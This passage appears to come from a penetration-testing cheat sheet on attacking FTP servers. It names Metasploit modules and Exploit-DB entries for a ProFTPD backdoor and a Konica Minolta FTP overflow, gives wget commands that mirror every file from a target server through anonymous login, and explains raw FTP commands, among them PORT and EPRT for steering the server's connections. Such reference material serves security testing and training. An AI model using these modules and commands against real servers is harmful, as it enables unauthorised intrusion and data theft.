[CVE-2015-3306]msf &gt; use exploit/unix/ftp/proftpd_133c_backdoorExploit-DB: 36742.txt#Konica Minolta FTP Utility 1.00 – CWD Command Overflow (SEH) [CVE-2015-7768]Exploit-DB: 39215msf &gt; use exploit/windows/ftp/kmftp_utility_cwdDownload All Files From FTP Serverwget -m ftp://anonymous:anonymous@10.10.x.x #Donwload allwget -m --no-passive ftp://anonymous:anonymous@10.10.x.x #Download allSome FTP CommandsUSER username PASS password HELP The server indicates which commands are supportedPORT 127,0,0,1,0,80This will indicate the FTP server to establish a connection with the IP 127.0.0.1 in port 80 (you need to put the 5th char as “0” and the 6th as the port in decimal or use the 5th and 6th to express the port in hex).EPRT |2|127.0.0.1|80|This will indicate the FTP server to establish a TCP connection (indicated by “2”) with the IP 127.0.0.1 in port 80. This command supports IPv6.LIST This will send the list of files in current folderAPPE /path/something.txt This will indicate the FTP to store the data received from a passive connection or from a PORT/EPRT connection to a file. If the filename exists, it will append the data.STOR /path/something.txt Like APPE but it will overwrite the filesSTOU /path/something.txt Like APPE, but if exists it won’t do anything.RETR /path/to/file A passive or a port connection must be establish. Then, the FTP server will send the indicated file through that connectionREST 6 This will indicate the server that next time it send something using RETR it should start in the 6th byte.TYPE i Set transfer to binaryPASV This will open a passive connection and will indicate the user were he can connects" } ]
